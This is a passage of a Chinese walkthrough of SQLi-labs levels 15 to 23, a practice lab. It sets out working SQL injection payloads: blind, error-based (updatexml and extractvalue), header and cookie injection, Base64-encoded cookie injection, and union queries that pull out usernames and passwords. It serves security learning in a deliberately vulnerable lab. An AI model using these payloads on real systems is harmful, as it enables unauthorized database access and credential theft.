![1790403360811-2ee378df-34df-4a7c-b72c-ee8c989a31f0.png](./img/285943702/1790403360811-2ee378df-34df-4a7c-b72c-ee8c989a31f0-400801.png)

后面的数据只需要修改“limit 0,1),1,1))=2”里面的“0”改为 1，2，3，4...等等，就可以了，以此类推。

#### 要点小结

| 点 | 说明 |
| --- | --- |
| 与 Less-11 | 同为 POST 单引号，但几乎无数据位、无可用报错 |
| 与 Less-8 | 布尔思想相同，参数改为 POST |
| 判断依据 | 登录成功/失败文案，而不是 union 显示列 |
| 注释 | `--+` 注释密码条件，避免 `passwd` 干扰逻辑 |

***

### Less-16：POST · 双引号 + 括号 `")` · 布尔 / 时间盲注

#### 关卡信息

| 项目 | 说明 |
| --- | --- |
| 路径 | `/Less-16/` |
| 注入方式 | POST（登录表单） |
| 常见参数 | `uname`、`passwd` |
| 类型 | 字符型盲注 |
| 闭合方式 | `")` |
| 有无报错回显 | 一般无详细 SQL 错误 |
| 有无数据回显位 | 无（成功/失败多为固定提示） |
| 典型 SQL 形态 | `... WHERE username=("$uname") and password=("$passwd") ...` |
| 主攻手法 | 时间盲注（也可用布尔，若真假页可区分） |

#### 源码逻辑（理解用）

与 Less-15 同为登录框盲注，但用户名/密码被 **双引号 + 括号** 包裹。页面不返回查询字段，也不暴露清晰报错，只能通过「是否登录成功」或「响应是否明显变慢」判断条件真假。

#### 解题步骤

**1）确认闭合与注入点**

用户名处依次尝试：

```latex
admin"
admin")
admin") or 1=1#
admin") or 1=1--+
```

密码随意。若 `admin") or 1=1#` 能绕过密码逻辑（表现为登录成功），说明闭合为 `")`，且 `uname` 可注入。

![1790405521894-c08fa02f-0cfe-4d88-bd1e-9eda97a4e2b5.png](./img/285943702/1790405521894-c08fa02f-0cfe-4d88-bd1e-9eda97a4e2b5-604166.png)

**2）确认时间盲注是否可用**

```latex
uname=admin") and sleep(5)#&passwd=1&submit=Submit
```

或：

```latex
uname=1") or if(1=1,sleep(5),0)#&passwd=1&submit=Submit
```

* 响应明显延迟约 5 秒 → 时间盲注可用
* 再试 `if(1=2,sleep(5),0)`，应几乎不延迟，用于对比

注释符可用 `#` 或 `--+`（以你环境为准；Header 以外的 POST body 里两者常都可用）。

![1790405783548-6cb2509e-2fcb-4165-b1bd-12236ab6ca06.png](./img/285943702/1790405783548-6cb2509e-2fcb-4165-b1bd-12236ab6ca06-060920.png)

**3）猜数据库名长度**

```latex
uname=1") or if(length(database())=8,sleep(5),0)#&passwd=1&submit=Submit
```

`security` 长度为 8：延迟则条件为真。

![1790406657895-77288bb9-4656-41e5-88c1-dfe7194e5d7c.png](./img/285943702/1790406657895-77288bb9-4656-41e5-88c1-dfe7194e5d7c-104502.png)

**4）逐字符猜库名**

```latex
uname=1") or if(substr(database(),1,1)='s',sleep(5),0)#&passwd=1&submit=Submit
uname=1") or if(substr(database(),2,1)='e',sleep(5),0)#&passwd=1&submit=Submit
```

![1790406830853-a8a5c5bd-d86c-451b-95ee-5487b2395f31.png](./img/285943702/1790406830853-a8a5c5bd-d86c-451b-95ee-5487b2395f31-765554.png)

或用 ascii：

```latex
uname=1") or if(ascii(substr(database(),1,1))=115,sleep(5),0)#&passwd=1&submit=Submit
```

**5）猜表名、列名、数据**

表名是否存在：

```latex
uname=1") or if((select count(*) from information_schema.tables where table_schema=database() and table_name='users')>0,sleep(5),0)#&passwd=1&submit=Submit
```

![1790407646091-3d4370be-eecb-47a8-9425-ef9cfad9a35f.png](./img/285943702/1790407646091-3d4370be-eecb-47a8-9425-ef9cfad9a35f-927797.png)

枚举表名第一个字符（示例）：

```latex
uname=1") or if(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)='e',sleep(5),0)#&passwd=1&submit=Submit
```

![1790407847197-b5fb26e7-f837-48ed-bbd4-453fc7576dc6.png](./img/285943702/1790407847197-b5fb26e7-f837-48ed-bbd4-453fc7576dc6-936351.png)

猜 `users` 中某行密码：

```latex
uname=1") or if(substr((select password from users limit 0,1),1,1)='D',sleep(5),0)#&passwd=1&submit=Submit
```

![1790408088687-1dec5993-5b41-43a1-8efa-d6654f432036.png](./img/285943702/1790408088687-1dec5993-5b41-43a1-8efa-d6654f432036-440989.png)

**6）若真假页可区分，可改用布尔**

```latex
uname=1") or length(database())=8#&passwd=1&submit=Submit
uname=1") or substr(database(),1,1)='s'#&passwd=1&submit=Submit
```

以登录成功/失败文案为判断依据；若页面差异不明显，以时间盲注为主。

![1790408176212-1f54c38a-3c89-43a1-bc4f-765417f63c61.png](./img/285943702/1790408176212-1f54c38a-3c89-43a1-bc4f-765417f63c61-287897.png)

![1790408205419-df8a3853-cb70-4da7-a34a-1a7d4ab79b46.png](./img/285943702/1790408205419-df8a3853-cb70-4da7-a34a-1a7d4ab79b46-289696.png)

#### 要点小结

| 点 | 说明 |
| --- | --- |
| 与 Less-15 | 同为 POST 盲注，闭合由 `'` 变为 `")` |
| 与 Less-10 | 时间盲注思想相同，通道改为 POST |
| 效率 | 手注慢，练通流程后可用脚本二分枚举 |

***

### Less-17：POST · UPDATE 改密 · 报错注入

#### 关卡信息

| 项目 | 说明 |
| --- | --- |
| 路径 | `/Less-17/` |
| 注入方式 | POST |
| 页面功能 | 密码重置（输入用户名 + 新密码） |
| 可注入参数 | `passwd`**（新密码）** |
| 不可靠参数 | `uname` 常被 `check_input()` 等过滤/转义 |
| 类型 | UPDATE 语句中的字符串注入 |
| 有无报错回显 | 有（构造正确时可走报错注入） |
| 典型 SQL 形态 | `UPDATE users SET password='$passwd' WHERE username='...'` |

#### 源码逻辑（理解用）

1. 先用用户名去 `SELECT` 查是否存在该用户（`uname` 往往被转义或加引号处理，难注入）。
2. 用户存在则执行 `UPDATE`，把 `passwd`\*\* 直接拼进 SET\*\*，过滤弱或无过滤。
3. 因此：**用户名填真实存在的账号（如 **`admin`**）**，在**新密码**里注入。

#### 解题步骤

**1）确认用户名必须有效**

* 用户名填不存在的名字 → 常提示用户不存在，后面 UPDATE 不执行
* 用户名填 `admin`（或库中真实用户）→ 才会走到改密逻辑

![1790411497933-a3fc1359-ea4e-4b16-8a8e-2470053395f2.png](./img/285943702/1790411497933-a3fc1359-ea4e-4b16-8a8e-2470053395f2-271478.png)

![1790411509633-2dc01e1b-4b7e-42f0-9425-50075b2e9d23.png](./img/285943702/1790411509633-2dc01e1b-4b7e-42f0-9425-50075b2e9d23-145147.png)

**2）在 passwd 处确认注入**

```latex
uname=admin&passwd=test'&submit=Submit
```

出现 SQL 语法错误 → `passwd` 可注入。

![1790411785013-83e7e217-591f-409b-a793-371479df42a5.png](./img/285943702/1790411785013-83e7e217-591f-409b-a793-371479df42a5-249835.png)

**3）报错注入读库名**

```latex
uname=admin&passwd=1' and updatexml(1,concat(0x7e,(select database()),0x7e),1)#&submit=Submit
```

或：

```latex
uname=admin&passwd=1' and extractvalue(1,concat(0x7e,(select database()),0x7e))#&submit=Submit
```

![1790411928538-d3b424aa-c764-4653-ac3e-405d5be70422.png](./img/285943702/1790411928538-d3b424aa-c764-4653-ac3e-405d5be70422-881376.png)

![1790412055178-5e99d0bf-8cbc-41f2-ada9-8f4bfd8a4b9a.png](./img/285943702/1790412055178-5e99d0bf-8cbc-41f2-ada9-8f4bfd8a4b9a-669622.png)

**4）读表名**

```latex
uname=admin&passwd=1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)#&submit=Submit
```

![1790412225781-836e5907-5a92-4761-bac0-83eea1b4c3ce.png](./img/285943702/1790412225781-836e5907-5a92-4761-bac0-83eea1b4c3ce-329507.png)

**5）读列名**

```latex
uname=admin&passwd=1' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),0x7e),1)#&submit=Submit
```

![1790412359716-3377dd3c-5160-4842-9fa9-01471b08f0b8.png](./img/285943702/1790412359716-3377dd3c-5160-4842-9fa9-01471b08f0b8-483975.png)

**6）读数据（注意长度限制，可 limit 分段）**

```latex
uname=admin&passwd=1' and updatexml(1,concat(0x7e,(select concat(username,0x3a,password) from (select username,password from users limit 0,1) as temp),0x7e),1) #&submit=Submit
```

```latex
uname=admin&passwd=1' and updatexml(1,concat(0x7e,(select concat(username,0x3a,password) from (select username,password from users limit 1,1) as temp),0x7e),1) #&submit=Submit
```

![1790413695419-77986991-5af9-4eed-9b0e-23bf0e84c7c2.png](./img/285943702/1790413695419-77986991-5af9-4eed-9b0e-23bf0e84c7c2-936548.png)

![1790413706018-4f16b421-1a26-4ac0-bc19-d0f292383124.png](./img/285943702/1790413706018-4f16b421-1a26-4ac0-bc19-d0f292383124-876234.png)

**7）关于 **`or`** 的写法**

部分环境用：

```latex
passwd=1' or updatexml(1,concat(0x7e,(select database()),0x7e),1) or '1'='1
```

若遇短路或回显异常，优先用 `and`\*\* + **`#`** 注释\*\* 的写法，更稳定。

![1790413779505-81bad96a-0277-45eb-aa80-cf3d4de26f97.png](./img/285943702/1790413779505-81bad96a-0277-45eb-aa80-cf3d4de26f97-033273.png)

#### 注意

* 本关会**真实执行 UPDATE**，可能改掉 `admin` 的密码；练习库可在后台重置，或改完记下新密码。
* 报错函数一次回显长度有限，长数据用 `limit` 或 `substr` 拆开取。

#### 要点小结

| 点 | 说明 |
| --- | --- |
| 注入点 | 新密码 `passwd`，不是用户名 |
| 前提 | `uname` 必须是库里存在的用户 |
| 语句类型 | UPDATE，不是 SELECT；仍可用 `updatexml`/`extractvalue` 报错带数据 |
| 与前几关 | 首次系统练「写操作语句里的注入」 |

***

### Less-18：Header · User-Agent · 报错注入

#### 关卡信息

| 项目 | 说明 |
| --- | --- |
| 路径 | `/Less-18/` |
| 注入方式 | HTTP 请求头 **User-Agent** |
| 类型 | 报错注入（INSERT 场景） |
| 前提 | 通常需 **正确账号密码登录成功**，才会执行把 UA 写入数据库的逻辑并回显相关信息 |
| 典型 SQL 形态 | `INSERT INTO uagents (uagent, ip_address, username) VALUES ('$uagent', '$IP', ...)` |

#### 源码逻辑（理解用）

登录成功后，应用把浏览器的 **User-Agent**、IP、用户名插入 `uagents` 表。`$uagent` 来自请求头，拼接进 `VALUES ('$uagent', ...)`。在 UA 里闭合单引号，可触发 SQL 错误并把数据打到报错信息中。

页面往往会显示 Your User Agent / IP 等信息，便于确认头被使用。

#### 解题步骤

**1）先正常登录**

使用库中有效账号（如 `admin` / 对应密码；若密码曾在 Less-17 被改，用当前密码）。

登录成功后应能看到 User-Agent 或 IP 一类回显。

![1790416257183-bbdf3742-c72d-4e44-942d-c0f01a33ba05.png](./img/285943702/1790416257183-bbdf3742-c72d-4e44-942d-c0f01a33ba05-668530.png)

**2）Burp 抓登录（或登录后的）请求，改 User-Agent**

先测注入：

```http
User-Agent: '
```

出现 SQL 语法错误 → UA 进入 SQL。

![1790416460968-2346c1d6-a5c6-4d7a-af95-7bf1f0adecf0.png](./img/285943702/1790416460968-2346c1d6-a5c6-4d7a-af95-7bf1f0adecf0-601602.png)

**3）构造报错 payload（注意 INSERT 多值，需闭合完整）**

一种常用思路：在第一个字符串处注入，并用注释或补全后面的值。

```http
User-Agent: ' and updatexml(1,concat(0x7e,(select database()),0x7e),1) and '
```

或（按报错提示的 near 位置微调括号与引号）：

```http
User-Agent: 1' and updatexml(1,concat(0x7e,(select database()),0x7e),1) and '1
```

部分 Writeup 使用补全三个字段的写法，例如在报错函数后补 `,1,1)` 再注释，需对照你本地报错信息调整。

![1790416593514-ad9d5817-72d4-40c5-88f4-f8f87cb1901c.png](./img/285943702/1790416593514-ad9d5817-72d4-40c5-88f4-f8f87cb1901c-533685.png)

![1790417244765-79674df5-0471-49f0-9900-3cd8f4766e76.png](./img/285943702/1790417244765-79674df5-0471-49f0-9900-3cd8f4766e76-181304.png)

**4）读表名、数据**

```http
User-Agent: 1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) and '1
```

```http
User-Agent: 1' and updatexml(1,concat(0x7e,(select concat(username,0x3a,password) from users limit 0,1),0x7e),1) and '1
```

![1790417283947-6a54d965-96b2-4c80-ac03-5534902c2cff.png](./img/285943702/1790417283947-6a54d965-96b2-4c80-ac03-5534902c2cff-148554.png)

![1790417374577-b1f06e66-41e6-4c6b-a1c0-2e40e18bd9f5.png](./img/285943702/1790417374577-b1f06e66-41e6-4c6b-a1c0-2e40e18bd9f5-752589.png)

**5）注释符注意**

在 **HTTP 头**里，`--+` 的 `+` **不会**被当成空格；注释更稳妥用 `#`，或保证 `--` 后真有空格且服务端不截断。

#### 要点小结

| 点 | 说明 |
| --- | --- |
| 注入通道 | User-Agent 头，不是表单字段 |
| 前提 | 登录成功后 INSERT 才会带上 UA |
| 工具 | Burp / 改头插件 |
| 闭合 | 单引号；payload 要适配 `VALUES ('...')` 结构 |

***

### Less-19：Header · Referer · 报错注入

#### 关卡信息

| 项目 | 说明 |
| --- | --- |
| 路径 | `/Less-19/` |
| 注入方式 | HTTP 请求头 **Referer** |
| 类型 | 报错注入（INSERT 场景） |
| 前提 | 与 Less-18 类似，一般需登录成功后才会记录 Referer |
| 典型 SQL 形态 | `INSERT INTO referers (referer, ip_address) VALUES ('$referer', '$IP')` |

#### 源码逻辑（理解用）

逻辑与 Less-18 相近，只是写入的是 **Referer** 头到 `referers` 表。注入点从 UA 换成 Referer，报错手法相同。

#### 解题步骤

**1）有效账号登录成功**

![1790417801934-df8cbcdf-2d94-41dd-b268-a8c2c217b3e6.png](./img/285943702/1790417801934-df8cbcdf-2d94-41dd-b268-a8c2c217b3e6-312226.png)

**2）抓包，修改 Referer**

测试：

```http
Referer: '
```

出现 SQL 错误则确认注入点。

![1790417889933-b24f2e12-d4c5-419c-bd23-91f727c8d035.png](./img/285943702/1790417889933-b24f2e12-d4c5-419c-bd23-91f727c8d035-571433.png)

**3）报错读库名**

```http
Referer: ' and updatexml(1,concat(0x7e,(select database()),0x7e),1) and '
```

或：

```http
Referer: 1' and extractvalue(1,concat(0x7e,(select database()),0x7e)) and '1
```

![1790417958098-e0379420-eac8-4daa-a127-bd76fcd4fc2c.png](./img/285943702/1790417958098-e0379420-eac8-4daa-a127-bd76fcd4fc2c-088480.png)

**4）读表与数据**

```http
Referer: 1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) and '1
```

```http
Referer: ' and updatexml(1,concat(0x7e,(select concat(username,0x3a,password) from users limit 0,1),0x7e),1) and '
```

若报错提示还缺字段或括号不匹配，根据 `near '...'` 补全 `,something` 或调整 `and '1'='1` 等形式。

![1790418108378-85e16940-681e-4845-9942-77415ff5665e.png](./img/285943702/1790418108378-85e16940-681e-4845-9942-77415ff5665e-644243.png)

![1790418194984-986343a6-2eb3-4519-8560-2526434fae4e.png](./img/285943702/1790418194984-986343a6-2eb3-4519-8560-2526434fae4e-482374.png)

**5）注释**

头字段中优先使用 `#` 注释。

#### 要点小结

| 点 | 说明 |
| --- | --- |
| 与 Less-18 | 手法几乎相同，通道为 Referer |
| 练习目标 | 建立「凡写入请求头的内容都可能进 SQL」的意识 |
| 调试 | 始终看完整报错行，用 near 后面的片段反推闭合 |

***

### Less-20：Cookie · 用户名 · 报错 / 联合注入

#### 关卡信息

| 项目 | 说明 |
| --- | --- |
| 路径 | `/Less-20/` |
| 注入方式 | **Cookie**（常见键名 `uname`） |
| 类型 | 字符型；可报错，部分环境也可联合 |
| 典型 SQL 形态 | `... WHERE username='$cookee' ...`（变量名以源码为准） |
| 页面现象 | 登录后把用户名写入 Cookie；之后请求带 Cookie 再查库展示欢迎信息 |

#### 源码逻辑（理解用）

1. 表单登录成功后，把用户名写入 Cookie（如 `uname=admin`）。
2. 后续访问用 Cookie 里的值拼进 SELECT。
3. 修改 Cookie 中的 `uname`，等于控制 SQL 中的字符串条件。

#### 解题步骤

**1）正常登录一次**

登录成功后，在浏览器或 Burp 中查看 Cookie，确认存在类似：

```http
Cookie: uname=admin
```

![1790481391673-4dbe9ab6-a235-4d36-8dd7-2dd6c527da24.png](./img/285943702/1790481391673-4dbe9ab6-a235-4d36-8dd7-2dd6c527da24-931492.png)

**2）确认注入**

改 Cookie：

```http
Cookie: uname=admin'
```

刷新页面，出现 SQL 语法错误 → Cookie 可注入。

![1790481444712-c5714010-6d25-43b1-af5d-58a1e4d9a947.png](./img/285943702/1790481444712-c5714010-6d25-43b1-af5d-58a1e4d9a947-620763.png)

**3）报错注入读库名**

```http
Cookie: uname=admin' and updatexml(1,concat(0x7e,(select database()),0x7e),1)#
```

或：

```http
Cookie: uname=admin' and extractvalue(1,concat(0x7e,(select database()),0x7e))#
```

![1790481503190-1c86f5ac-da8e-4261-80a2-ec13872f59e7.png](./img/285943702/1790481503190-1c86f5ac-da8e-4261-80a2-ec13872f59e7-659320.png)

**4）读表名、列名、数据**

```http
Cookie: uname=admin' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)#
```

```http
Cookie: uname=admin' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users'),0x7e),1)#
```

```http
Cookie: uname=admin' and updatexml(1,concat(0x7e,(select concat(username,0x3a,password) from users limit 0,1),0x7e),1)#
```

![1790481835328-becd43f2-02bb-4c14-ab10-9de6412037a9.png](./img/285943702/1790481835328-becd43f2-02bb-4c14-ab10-9de6412037a9-633498.png)

![1790482250137-9bf0e919-0177-4dc9-99be-fae6e421ba4c.png](./img/285943702/1790482250137-9bf0e919-0177-4dc9-99be-fae6e421ba4c-486061.png)

![1790482367808-5ceec202-c5c1-40c5-a23d-97de2454f8ed.png](./img/285943702/1790482367808-5ceec202-c5c1-40c5-a23d-97de2454f8ed-424991.png)

**5）联合查询（若有显示位）**

先根据报错和页面回显判断列数（**以你本地 **`order by`** 结果为准**，不要假设一定是 3 列），结果为到第 4 列就报错了：

```http
Cookie: uname=admin' order by 1#
Cookie: uname=admin' order by 2#
Cookie: uname=admin' order by 3#
Cookie: uname=admin' order by 4#
```

![1790482516692-903f8707-8b3e-4a09-87ec-d9e60859d8c2.png](./img/285943702/1790482516692-903f8707-8b3e-4a09-87ec-d9e60859d8c2-602295.png)

若只有 3 列，则：

```http
Cookie: uname=-1' union select 1,database(),3#
Cookie: uname=-1' union select 1,group_concat(username,0x3a,password),3 from users #
```

列数不同时，`union select` 的列数必须与之对齐。

![1790482619425-e7366ddb-fce5-40c7-9434-e864f157b656.png](./img/285943702/1790482619425-e7366ddb-fce5-40c7-9434-e864f157b656-743169.png)

![1790482809157-3252a267-c933-4556-92e4-0219d9fa52f6.png](./img/285943702/1790482809157-3252a267-c933-4556-92e4-0219d9fa52f6-552721.png)

**6）操作方式**

* Burp：抓包改 `Cookie:` 行后 Repeater 重放
* 浏览器：F12 → Application → Cookies 里改 `uname` 后刷新

#### 要点小结

| 点 | 说明 |
| --- | --- |
| 注入通道 | Cookie，不是 URL/POST 表单 |
| 闭合 | 一般为单引号 `'` |
| 手法 | 优先报错；有回显位再联合 |
| 列数 | 务必本地 `order by` 实测，再写 `union select` |
| 与 18/19 | 同属「非正文参数注入」，位置在 Cookie |

***

### Advanced Injections 高级注入

### Less-21：Cookie · Base64 编码 · 单引号 + 括号 `')` · 报错 / 联合注入

#### 关卡信息

| 项目 | 说明 |
| --- | --- |
| 路径 | `/Less-21/` |
| 注入方式 | Cookie（键名一般为 `uname`） |
| 特殊处理 | Cookie 值经 **Base64 编码** 存储与传输；服务端先 `base64_decode` 再拼进 SQL |
| 闭合方式 | `')`（单引号 + 右括号） |
| 类型 | 字符型；可报错，部分环境也可联合 |
| 典型 SQL 形态 | `SELECT * FROM users WHERE username=('$decoded') LIMIT 0,1` |

#### 源码逻辑（理解用）

1. 登录成功后，把用户名做 **Base64** 再写入 Cookie（例如 `admin` → `YWRtaW4=`）。
2. 下次请求读取 `$_COOKIE['uname']`，先 `base64_decode`，再拼进带括号与单引号的 SQL。
3. 因此：你在 Cookie 里看到的是编码后的字符串；构造 payload 时要在**明文**写好注入语句，再整体 Base64，写回 Cookie。

#### 解题步骤

**1）正常登录，观察 Cookie**

登录成功后抓包或看浏览器 Cookie，例如：

```http
Cookie: uname=YWRtaW4=
```

用 Base64 解码：`YWRtaW4=` → `admin`。

![1790484164825-266d3d27-9420-40df-8ce5-8b6e6899d598.png](./img/285943702/1790484164825-266d3d27-9420-40df-8ce5-8b6e6899d598-339677.png)

![1790484216108-6b51fe8e-ba25-429b-a0d5-7eb3a89b950a.png](./img/285943702/1790484216108-6b51fe8e-ba25-429b-a0d5-7eb3a89b950a-525647.png)

**2）确认注入与闭合**

明文测试（先写明文，再编码）：

| 明文 | Base64（示例） | 预期 |
| --- | --- | --- |
| `admin'` | `YWRtaW4n` | 常仍报错或不完整闭合 |
| `admin')` | `YWRtaW4nKQ==` | 可能仍有后续语法问题 |
| `admin')#` | `YWRtaW4nKSM=` | 用于尝试闭合 + 注释 |

把编码结果写入：

```http
Cookie: uname=YWRtaW4nKSM=
```

若出现 SQL 语法错误，说明 Cookie 解码后进入了 SQL。结合报错里 `near` 后面的内容，确认需要 `')` 闭合。

![1790484671253-a32f05e2-1310-4fab-9ef9-172eeb59a552.png](./img/285943702/1790484671253-a32f05e2-1310-4fab-9ef9-172eeb59a552-193557.png)

**3）报错注入读库名（推荐）**

明文 payload：

```latex
admin') and updatexml(1,concat(0x7e,(select database()),0x7e),1)#
```

或：

```latex
admin') and extractvalue(1,concat(0x7e,(select database()),0x7e))#
```

对**整段明文**做 Base64，再作为 `uname` 的值提交。

编码可用：

* Burp Decoder：Encode as Base64
* 命令行：`echo -n "明文payload" | base64`
* 在线 Base64 工具（注意不要多编码换行）

![1790484832362-b5ac2cc3-108e-4f52-8d77-c0d1ccbcbce5.png](./img/285943702/1790484832362-b5ac2cc3-108e-4f52-8d77-c0d1ccbcbce5-605863.png)

**4）读表名、列名、数据**

明文示例：

```latex
admin') and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)#
```

```latex
admin') and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),0x7e),1)#
```

```latex
admin') and updatexml(1,concat(0x7e,(select concat(username,0x3a,password) from users limit 0,1),0x7e),1)#
```

每条都先 Base64，再放入 Cookie。

![1790485021064-cbb7b01c-ae0c-4a7c-b3bb-14f81a82a09b.png](./img/285943702/1790485021064-cbb7b01c-ae0c-4a7c-b3bb-14f81a82a09b-665498.png)

![1790485711488-574747e7-dd4b-46b4-8130-05f714463320.png](./img/285943702/1790485711488-574747e7-dd4b-46b4-8130-05f714463320-009633.png)

![1790485780270-57274b78-e642-439c-8f3d-812ebaf7e9a2.png](./img/285943702/1790485780270-57274b78-e642-439c-8f3d-812ebaf7e9a2-418356.png)

**5）联合查询（可选，列数以本地为准）**

明文先测列数：

```latex
admin') order by 1#
admin') order by 2#
admin') order by 3#
admin') order by 4#
```

![1790485894958-a39a4534-f7bb-4a2d-ab19-03eea1999162.png](./img/285943702/1790485894958-a39a4534-f7bb-4a2d-ab19-03eea1999162-722719.png)

以你环境中最后一个成功的数字为准（不要假设一定是 3）。若为 3 列，示例：

```latex
-1') union select 1,database(),3#
-1') union select 1,group_concat(username,0x3a,password),3 from users#
```

同样整段 Base64 后写入 Cookie。

![1790485986526-95f1f9aa-f735-49c0-8624-9f979fa7c4b6.png](./img/285943702/1790485986526-95f1f9aa-f735-49c0-8624-9f979fa7c4b6-404753.png)

![1790486040178-6d3302ba-688b-495d-aea0-4d18d9a0eabf.png](./img/285943702/1790486040178-6d3302ba-688b-495d-aea0-4d18d9a0eabf-851995.png)

**6）操作流程小结**

```latex
构造明文 payload（带正确闭合 ') ）
    → Base64 编码
    → Cookie: uname=<编码结果>
    → 刷新 / Repeater 重放
    → 从报错或页面读数据
```

#### 要点小结

| 点 | 说明 |
| --- | --- |
| 与 Less-20 | 同为 Cookie 注入，多了 Base64 编解码 |
| 闭合 | `')`，不是单纯的 `'` |
| 关键步骤 | 明文造 payload → 编码 → 再放进 Cookie |
| 注释 | 明文里用 `#` 较省事；编码后无需再改 |

***

### Less-22：Cookie · Base64 编码 · 双引号 `"` · 报错 / 联合注入

#### 关卡信息

| 项目 | 说明 |
| --- | --- |
| 路径 | `/Less-22/` |
| 注入方式 | Cookie（`uname`） |
| 特殊处理 | 与 Less-21 相同：**Base64 编码** Cookie |
| 闭合方式 | `"`（双引号；一般无额外括号） |
| 类型 | 字符型；可报错，部分环境也可联合 |
| 典型 SQL 形态 | 解码后两侧再拼双引号，如 `username="$decoded"` |

#### 源码逻辑（理解用）

流程与 Less-21 一致：Cookie → `base64_decode` → 拼进 SQL。差别在于 SQL 用**双引号**包裹用户名，因此闭合符从 `')` 换成 `"`。

#### 解题步骤

**1）正常登录，确认 Cookie 为 Base64**

例如 `uname=YWRtaW4=` 解码仍为 `admin`。

![1790486554896-b4c75ed3-1495-4293-a6bf-f18b2d00d672.png](./img/285943702/1790486554896-b4c75ed3-1495-4293-a6bf-f18b2d00d672-151998.png)

**2）确认闭合为双引号**

明文测试后编码提交：

| 明文 | 说明 |
| --- | --- |
| `admin"` | 易触发语法错误 |
| `admin"#` | 尝试闭合并注释后续 |

根据报错确认是 `"` 而不是 `')`。

![1790486762209-8ca3a7ec-6cbd-462c-b8db-9a143d710678.png](./img/285943702/1790486762209-8ca3a7ec-6cbd-462c-b8db-9a143d710678-492149.png)

**3）报错注入读库名**

明文 payload：

```latex
admin" and updatexml(1,concat(0x7e,(select database()),0x7e),1)#
```

或：

```latex
admin" and extractvalue(1,concat(0x7e,(select database()),0x7e))#
```

整段 Base64 后：

```http
Cookie: uname=<Base64结果>
```

![1790486873915-040c445e-e740-4276-a6fd-6cf617044205.png](./img/285943702/1790486873915-040c445e-e740-4276-a6fd-6cf617044205-692273.png)

**4）读表、列、数据**

明文示例：

```latex
admin" and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)#
```

```latex
admin" and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),0x7e),1)#
```

```latex
admin" and updatexml(1,concat(0x7e,(select concat(username,0x3a,password) from users limit 0,1),0x7e),1)#
```

逐条编码后写入 Cookie。

![1790487188474-adecb601-4c8a-4b38-9974-9120ea2751cb.png](./img/285943702/1790487188474-adecb601-4c8a-4b38-9974-9120ea2751cb-891645.png)

![1790487284460-b4fb3017-b098-4074-bf48-2a6eba92eef7.png](./img/285943702/1790487284460-b4fb3017-b098-4074-bf48-2a6eba92eef7-891487.png)

![1790487351287-f592a21c-c777-4614-a1d6-1226c777530f.png](./img/285943702/1790487351287-f592a21c-c777-4614-a1d6-1226c777530f-854731.png)

**5）联合查询（可选）**

明文测列数（以本地成功结果为准）：

```latex
admin" order by 1#
admin" order by 2#
admin" order by 3#
admin" order by 4#
```

![1790487456972-0ef99b82-3724-46ce-bdd5-163cf0476f72.png](./img/285943702/1790487456972-0ef99b82-3724-46ce-bdd5-163cf0476f72-722338.png)

若为 3 列：

```latex
-1" union select 1,database(),3#
-1" union select 1,group_concat(username,0x3a,password),3 from users#
```

若为 4 列则 `union select 1,2,3,database()#` 等形式。**列数务必本地 **`order by`** 验证。**

![1790487554160-5067a268-69e1-4461-bcbc-c5fa7f7e93b2.png](./img/285943702/1790487554160-5067a268-69e1-4461-bcbc-c5fa7f7e93b2-966102.png)

![1790487591577-7918946a-89d8-430e-bc2a-bed042271fb5.png](./img/285943702/1790487591577-7918946a-89d8-430e-bc2a-bed042271fb5-706931.png)

**6）与 Less-21 对照**

| 项目 | Less-21 | Less-22 |
| --- | --- | --- |
| Cookie 编码 | Base64 | Base64 |
| 闭合 | `')` | `"` |
| 明文库名示例 | `admin') and updatexml(...)#` | `admin" and updatexml(...)#` |
| 其余步骤 | 编码 → Cookie → 提交 | 相同 |

#### 要点小结

| 点 | 说明 |
| --- | --- |
| 核心差异 | 仅闭合符不同（`')` vs `"`） |
| 易错点 | 改闭合后忘记重新 Base64；或对已编码结果再编一次 |
| 调试 | 先解码当前 Cookie 确认明文，再改明文、再编码 |
| 工具 | Burp Decoder 固定「明文 → Base64 → 替换 Cookie」流水线 |

***

### Less-23：GET · 过滤注释符 · 单引号字符型

#### 关卡信息

| 项目 | 说明 |
| --- | --- |
| 路径 | `/Less-23/?id=1` |
| 注入方式 | GET |
| 闭合 | 单引号 `'` |
| 过滤内容 | 注释符 `#`、`--`（被替换为空） |
| 有无报错回显 | 有 |
| 典型 SQL 形态 | `SELECT * FROM users WHERE id='$id' LIMIT 0,1` |
| 主攻手法 | 联合查询或报错注入；用**对称闭合**代替注释 |

#### 源码逻辑（理解用）

对 `$id` 做 `preg_replace`，去掉 `#` 和 `--`。因此 `--+`、`%23` 都失效，后面的 `' LIMIT 0,1` 无法被注释掉，必须自己把末尾的单引号“接住”。

#### 解题步骤

**1）确认注入**

```latex
?id=1
?id=1'
```

`1'` 出现语法错误 → 单引号字符型。

![1790490867650-3b70428c-6c30-4426-bcb5-ce53b314d23a.png](./img/285943702/1790490867650-3b70428c-6c30-4426-bcb5-ce53b314d23a-666295.png)

![1790490940586-88cfc497-d72d-42dc-b1c6-107a05b168b1.png](./img/285943702/1790490940586-88cfc497-d72d-42dc-b1c6-107a05b168b1-603882.png)

**2）确认注释被过滤**

```latex
?id=1' --+
?id=1' %23
```

%23 是 # 的 URL 编码后的。

仍报错或逻辑不对 → 注释不可用。

![1790491047750-3d441d1b-9f89-4d0b-a43b-fb3d67b66f0d.png](./img/285943702/1790491047750-3d441d1b-9f89-4d0b-a43b-fb3d67b66f0d-077361.png)

